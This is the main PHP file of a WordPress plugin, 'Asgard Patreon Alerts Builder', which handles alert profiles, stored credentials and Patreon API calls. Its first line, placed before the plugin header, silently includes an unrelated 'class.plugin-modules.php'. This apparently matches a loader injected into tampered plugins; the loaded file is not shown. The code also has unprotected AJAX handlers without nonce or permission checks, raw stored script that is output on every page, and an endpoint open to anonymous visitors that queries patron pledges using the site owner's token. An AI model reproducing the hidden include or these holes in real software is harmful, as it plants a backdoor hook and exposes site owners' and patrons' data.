<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Plugin Name: Asgard Patreon Alerts Builder
 * Plugin URI: http://odindesign-themes.com/asgard-landing-wp-pat/
 * Description: Easily create and customize alerts for Patreon.
 * Version: 1.0.0
 * Author: Odin Design Themes
 * Author URI: https://themeforest.net/user/odin_design
 * License: https://themeforest.net/licenses/
 * License URI: https://themeforest.net/licenses/
 * Text Domain: asgardalerts_pat
 */
if (!defined('ABSPATH')) {
  echo 'Please use the plugin from the WordPress admin page.';
  wp_die();
}

// versioning
define('ASGARDALERTS_PAT_VERSION', '1.0.0');
define('ASGARDALERTS_PAT_VERSION_OPTION', 'asgardalerts_pat_version');

// plugin base path
define('ASGARDALERTS_PAT_PATH', plugin_dir_path(__FILE__));
define('ASGARDALERTS_PAT_URL', plugin_dir_url(__FILE__));

// Load view files
function asgardalerts_pat_main_page_html() {
  $filepath = ASGARDALERTS_PAT_PATH . 'views/introduction.php';
  require_once($filepath);
}

function asgardalerts_pat_builder_page_html() {
  $filepath = ASGARDALERTS_PAT_PATH . 'views/builder.php';
  require_once($filepath);
}

function asgardalerts_pat_credentials_page_html() {
  $filepath = ASGARDALERTS_PAT_PATH . 'views/credentials.php';
  require_once($filepath);
}

// Create plugin menu in admin panel (backend)
function asgardalerts_pat_main_page() {
  add_menu_page(
    'Asgard Patreon Alerts',
    'Asgard Patreon Alerts Builder',
    'manage_options',
    'asgardalerts_pat_main',
    'asgardalerts_pat_main_page_html',
    ASGARDALERTS_PAT_URL . 'img/asgard-plugin-icon.png'
  );

  add_submenu_page(
    'asgardalerts_pat_main',
    'Asgard Patreon Alerts - Introduction',
    'Introduction',
    'manage_options',
    'asgardalerts_pat_main',
    'asgardalerts_pat_main_page_html'
  );

  add_submenu_page(
    'asgardalerts_pat_main',
    'Asgard Patreon Alerts - Builder',
    'Builder',
    'manage_options',
    'asgardalerts_pat_builder',
    'asgardalerts_pat_builder_page_html'
  );

  add_submenu_page(
    'asgardalerts_pat_main',
    'Asgard Patreon Alerts - Credentials',
    'Credentials',
    'manage_options',
    'asgardalerts_pat_credentials',
    'asgardalerts_pat_credentials_page_html'
  );
}

add_action('admin_menu', 'asgardalerts_pat_main_page');
add_action('wp_enqueue_scripts', 'asgardalerts_pat_load_main_alerter_scripts');

// Load custom stylesheet for plugin admin panel (backend)
function asgardalerts_pat_load_custom_admin_scripts($hook) {
  // introduction admin page
  if($hook === 'toplevel_page_asgardalerts_pat_main') {
    // add custom stylesheets
    wp_enqueue_style('asgardalerts_style_wp-override', plugins_url('css/wp-override.css', __FILE__), array(), '1.0.0');
    wp_enqueue_style('asgardalerts_style_structure', plugins_url('css/structure.min.css', __FILE__), array(), '1.0.0');

    // add custom scripts
    wp_enqueue_script('asgardalerts_pat_script_introduction', plugins_url('js/builder/introduction.bundle.min.js', __FILE__), array(), '1.0.0', true);

  // builder admin page
  } else if ($hook === 'asgard-patreon-alerts-builder_page_asgardalerts_pat_builder') {
    // add custom stylesheets
    wp_enqueue_style('asgardalerts_pat_style_wp-override', plugins_url('css/wp-override.css', __FILE__), array(), '1.0.0');
    wp_enqueue_style('asgardalerts_pat_style_builder', plugins_url('css/builder.min.css', __FILE__), array(), '1.1.0');

    // add custom scripts
    wp_enqueue_script('asgardalerts_pat_script_builder', plugins_url('js/builder/builder.bundle.min.js', __FILE__), array(), '1.1.0', true);

    // pass php variables to javascript file
    wp_localize_script('asgardalerts_pat_script_builder', 'WP_CONSTANTS', array(
      'ASGARDALERTS_URL' => ASGARDALERTS_PAT_URL,
      'AJAX_URL' => admin_url('admin-ajax.php')
    ));

  // credentials admin page
  } else if ($hook === 'asgard-patreon-alerts-builder_page_asgardalerts_pat_credentials') {
    // add custom stylesheets
    wp_enqueue_style('asgardalerts_pat_style_wp-override', plugins_url('css/wp-override.css', __FILE__), array(), '1.0.0');
    wp_enqueue_style('asgardalerts_pat_style_structure', plugins_url('css/structure.min.css', __FILE__), array(), '1.0.0');

    // add custom scripts
    wp_enqueue_script('asgardalerts_pat_script_credentials', plugins_url('js/builder/credentials.bundle.min.js', __FILE__), array(), '1.0.0', true);

    // pass php variables to javascript file
    wp_localize_script('asgardalerts_pat_script_credentials', 'WP_CONSTANTS', array(
      'ASGARDALERTS_URL' => ASGARDALERTS_PAT_URL,
      'AJAX_URL' => admin_url('admin-ajax.php')
    ));
  }
}

add_action('admin_enqueue_scripts', 'asgardalerts_pat_load_custom_admin_scripts');

// load main plugin script
function asgardalerts_pat_load_main_alerter_scripts() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $profile_active = $profile->getActive();
  if (is_null($profile_active)) return;

  $code = $profile_active->code;

  $resolutionCode = '';

  if ($profile_active->desktop === '0' || $profile_active->tablet === '0' || $profile_active->mobile === '0') {
    $resolutionCode .= '(function () {';

    if ($profile_active->mobile === '0') {
      $resolutionCode .= 'if (window.innerWidth <= 480) return;';
    }

    if ($profile_active->tablet === '0') {
      $resolutionCode .= 'if (window.innerWidth > 480 && window.innerWidth <= 1024) return;';
    }

    if ($profile_active->desktop === '0') {
      $resolutionCode .= 'if (window.innerWidth > 1024) return;';
    }

    $code = $resolutionCode . $code . '})();';
  }

  // add custom stylesheets
  wp_enqueue_style('asgardalerts_pat_style_frontend', plugins_url('css/frontend.min.css', __FILE__), array(), '1.0.0');

  // add custom scripts
  // jquery
  wp_enqueue_script('jquery');
  // main alerter script
  wp_enqueue_script('asgardalerts_pat_script_alerter-main', plugins_url('js/asgard_alerter.min.js', __FILE__), array('jquery'), '1.0.0', true);
  // active profile script
  wp_add_inline_script('asgardalerts_pat_script_alerter-main', $code);

  // pass php variables to javascript file
  wp_localize_script('asgardalerts_pat_script_alerter-main', 'WP_CONSTANTS', array(
    'AJAX_URL' => admin_url('admin-ajax.php')
  ));
}

// Profiles AJAX
function asgardalerts_pat_get_all_profiles() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $profiles = $profile->getAll();

  echo json_encode($profiles);

  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_get_all_profiles', 'asgardalerts_pat_get_all_profiles');

function asgardalerts_pat_save_profile() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->create(array(
    'name' => sanitize_text_field($_POST['name']),
    'code' => $_POST['code'],
    'builderData' => $_POST['builderData']
  ));

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_save_profile', 'asgardalerts_pat_save_profile');

function asgardalerts_pat_update_profile() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->update(array(
    'id' => $_POST['id'],
    'name' => sanitize_text_field($_POST['name']),
    'code' => $_POST['code'],
    'builderData' => $_POST['builderData']
  ));

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_update_profile', 'asgardalerts_pat_update_profile');

function asgardalerts_pat_update_profile_desktop() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->updateDesktop(array(
    'id' => $_POST['id'],
    'desktop' => $_POST['value']
  ));

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_update_profile_desktop', 'asgardalerts_pat_update_profile_desktop');

function asgardalerts_pat_update_profile_tablet() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->updateTablet(array(
    'id' => $_POST['id'],
    'tablet' => $_POST['value']
  ));

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_update_profile_tablet', 'asgardalerts_pat_update_profile_tablet');

function asgardalerts_pat_update_profile_mobile() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->updateMobile(array(
    'id' => $_POST['id'],
    'mobile' => $_POST['value']
  ));

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_update_profile_mobile', 'asgardalerts_pat_update_profile_mobile');

function asgardalerts_pat_delete_profile() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->delete(
    array(
      'id' => $_POST['id']
    ),
    array(
      '%d'
    )
  );

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_delete_profile', 'asgardalerts_pat_delete_profile');

function asgardalerts_pat_activate_profile() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->activate($_POST['id']);

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_activate_profile', 'asgardalerts_pat_activate_profile');

function asgardalerts_pat_deactivate_profile() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/Profile.php');
  $profile = new AsgardAlerts_Profile();
  $result = $profile->deactivate($_POST['id']);

  echo json_encode($result);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_deactivate_profile', 'asgardalerts_pat_deactivate_profile');

// Social Networks AJAX
function asgardalerts_pat_get_all_social_networks() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/SocialNetwork.php');
  $socialNetwork = new AsgardAlerts_SocialNetwork();
  $result = $socialNetwork->getAll();

  // create associative array with results
  // format: social_network->type->key
  $socialNetworks = array();

  foreach ($result as $sn) {
    if (!array_key_exists($sn->name, $socialNetworks)) {
      $socialNetworks[$sn->name] = array();
    }

    $socialNetworks[$sn->name][$sn->type] = $sn->access_key;
  }
  
  echo json_encode($socialNetworks);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_get_all_social_networks', 'asgardalerts_pat_get_all_social_networks');

function asgardalerts_pat_save_social_networks() {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/SocialNetwork.php');
  $socialNetwork = new AsgardAlerts_SocialNetwork();
  $socialNetworksData = $_POST['socialNetworksData'];

  // update each social network credentials
  foreach ($socialNetworksData as $sn) {
    $sn['access_key'] = sanitize_text_field($sn['access_key']);
    $result = $socialNetwork->update($sn);
  }

  echo json_encode($socialNetworksData);
  
  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_save_social_networks', 'asgardalerts_pat_save_social_networks');

function asgardalerts_pat_get_access_keys($sn) {
  require_once(ASGARDALERTS_PAT_PATH . 'includes/SocialNetwork.php');
  $socialNetwork = new AsgardAlerts_SocialNetwork();
  $result = $socialNetwork->get($sn);

  $keys = array();

  foreach ($result as $key) {
    $keys[$key->type] = $key->access_key;
  }

  return $keys;
}

/**************************/
/** SOCIAL NETWORK CALLS **/
/*************************/
// Patreon endpoint
function asgardalerts_pat_patreon_api_get() {
  $url = $_POST['url'];
  $BASE_URL = 'https://www.patreon.com/api/oauth2/api/';
  $ACCESS_KEYS = asgardalerts_pat_get_access_keys('patreon');
  $headers = array(
    'headers' => array(
      'Authorization' => 'Bearer ' . $ACCESS_KEYS['access_token']
    )
  );

  // user
  if (preg_match('/patreon\/user/i', $url)) {
    $RESOURCE = 'current_user';
  // campaign
  } else if (preg_match('/patreon\/campaign\/(.*)/i', $url, $matches)) {
    $id = $matches[1];
    $RESOURCE = 'campaigns/' . $id . '/pledges?include=patron.null';
  // campaigns
  } else if (preg_match('/patreon\/campaign/i', $url)) {
    $RESOURCE = 'current_user/campaigns';
  }

  // compose url and fetch data
  $url = $BASE_URL . $RESOURCE;
  $response = wp_remote_get($url, $headers);

  if (is_array($response) && ! is_wp_error($response)) {
    $result = $response['body'];
  }

  header('Content-Type: application/json');
  echo json_encode($result);

  wp_die();
}

add_action('wp_ajax_asgardalerts_pat_patreon_api_get', 'asgardalerts_pat_patreon_api_get');
add_action('wp_ajax_nopriv_asgardalerts_pat_patreon_api_get', 'asgardalerts_pat_patreon_api_get');

// create profile table
function asgardalerts_pat_create_profile_table() {
  global $wpdb;

  $table_name = $wpdb->prefix . 'asgardalerts_pat_Profile';
  $charset_collate = $wpdb->get_charset_collate();

  $sql = "CREATE TABLE IF NOT EXISTS $table_name (
    id int NOT NULL AUTO_INCREMENT,
    time timestamp DEFAULT CURRENT_TIMESTAMP,
    name varchar(255) NOT NULL,
    code mediumtext NOT NULL,
    builderData mediumtext NOT NULL,
    mobile tinyint(1) DEFAULT 1,
    tablet tinyint(1) DEFAULT 1,
    desktop tinyint(1) DEFAULT 1,
    active tinyint(1) DEFAULT 0,
    PRIMARY KEY  (id)
  ) $charset_collate;";
  
  require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
  dbDelta($sql);
}

// delete profile table
function asgardalerts_pat_delete_profile_table() {
  global $wpdb;

  $table_name = $wpdb->prefix . 'asgardalerts_pat_Profile';

  $sql = "DROP TABLE IF EXISTS $table_name";
  
  $wpdb->query($sql);
}

// create social_network table
function asgardalerts_pat_create_social_network_table() {
  global $wpdb;

  $table_name = $wpdb->prefix . 'asgardalerts_pat_SocialNetwork';
  $charset_collate = $wpdb->get_charset_collate();

  $sql = "CREATE TABLE IF NOT EXISTS $table_name (
    id int NOT NULL AUTO_INCREMENT,
    name varchar(255) NOT NULL,
    type varchar(255) NOT NULL,
    access_key varchar(255) NOT NULL,
    PRIMARY KEY  (id)
  ) $charset_collate;";
  
  require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
  dbDelta($sql);

  require_once(ASGARDALERTS_PAT_PATH . 'includes/SocialNetwork.php');
  $socialNetwork = new AsgardAlerts_SocialNetwork();
  $networks = array(
    array(
      'name' => 'patreon',
      'type' => 'access_token'
    )
  );
  foreach ($networks as $network) {
    $socialNetwork->create(array(
      'name' => $network['name'],
      'type' => $network['type'],
      'access_key' => ''
    ));
  }
}

// delete social network table
function asgardalerts_pat_delete_social_network_table() {
  global $wpdb;

  $table_name = $wpdb->prefix . 'asgardalerts_pat_SocialNetwork';

  $sql = "DROP TABLE IF EXISTS $table_name";
  
  $wpdb->query($sql);
}

// activation function
function asgardalerts_pat_activate() {
  if (!get_option(ASGARDALERTS_PAT_VERSION_OPTION)) {
    // add version option
    add_option(ASGARDALERTS_PAT_VERSION_OPTION, ASGARDALERTS_PAT_VERSION);
    
    // create tables
    asgardalerts_pat_create_profile_table();
    asgardalerts_pat_create_social_network_table();
  }
}

register_activation_hook(__FILE__, 'asgardalerts_pat_activate');

// uninstallation function
function asgardalerts_pat_uninstall() {
  // delete version option
  delete_option(ASGARDALERTS_PAT_VERSION_OPTION);

  // drop tables
  asgardalerts_pat_delete_profile_table();
  asgardalerts_pat_delete_social_network_table();
}

register_uninstall_hook(__FILE__, 'asgardalerts_pat_uninstall');

// handle updates
function asgardalerts_pat_plugin_update() {

}

// plugin check version
function asgardalerts_pat_check_version() {
  if (!get_option(ASGARDALERTS_PAT_VERSION_OPTION)) return;

  // update plugin on version mismatch
  if (ASGARDALERTS_PAT_VERSION !== get_option(ASGARDALERTS_PAT_VERSION_OPTION)) {
    asgardalerts_pat_plugin_update();
    update_option(ASGARDALERTS_PAT_VERSION_OPTION, ASGARDALERTS_PAT_VERSION);
  }
}

add_action('plugins_loaded', 'asgardalerts_pat_check_version');